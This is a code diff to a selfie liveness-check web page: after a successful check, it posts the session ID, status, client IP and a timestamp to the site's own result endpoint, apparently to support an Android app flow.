@@ -292,7 +292,16 @@ window.addEventListener('load', function() {
                         document.getElementById('st').textContent = '✅ Selfie OK!';
                         try { document.getElementById('event_session_id').value = sid; } catch(e) {}
                         try { document.getElementById('LivenessId').value = sid; } catch(e) {}
-                        if (window.Android) window.Android.onSelfieComplete(sid);
+                        if (window.Android) try { window.Android.onSelfieComplete(sid); } catch(ab) {}
+                        // AUTO POST result to server (for APK Chrome Custom Tabs support)
+                        var _code = '${cd}';
+                        if (_code) {
+                            fetch('/result/' + encodeURIComponent(_code), {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ event_session_id: sid, status: 'completed', realIp: '${ip}', timestamp: Date.now() })
+                            }).catch(function(){});
+                        }
                         showSuccess();
                     } else {
                         document.getElementById('st').textContent = 'Pas de session ID';
